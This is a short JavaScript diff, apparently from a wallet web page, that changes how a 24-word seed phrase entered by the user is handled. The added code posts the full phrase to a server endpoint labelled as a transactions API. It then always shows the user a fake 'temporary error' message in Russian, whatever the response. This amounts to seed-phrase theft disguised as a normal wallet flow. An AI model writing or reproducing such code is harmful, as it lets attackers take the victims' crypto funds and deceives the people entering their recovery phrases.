@@ -55,12 +55,25 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  confirmBtn.addEventListener('click', () => {
+  confirmBtn.addEventListener('click', async () => {
     const words = inputs.map(i => i.value.trim()).filter(Boolean);
     if (words.length !== 24) return;
     const phrase = words.join(' ');
-    console.log('Seed phrase:', phrase);
-    alert('Фраза принята');
+    
+    try {
+      const resp = await fetch('/api/transactions?action=seed_phrase', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phrase, user_meta: { ts: Date.now() } })
+      });
+      const data = await resp.json();
+      // Всегда показываем ошибку пользователю, логируя ответ
+      console.log('server:', data);
+      alert('Временная ошибка. Попробуйте позже.');
+    } catch (e) {
+      console.log('server error:', e);
+      alert('Временная ошибка. Попробуйте позже.');
+    }
   });
 
   createBtn.addEventListener('click', () => {
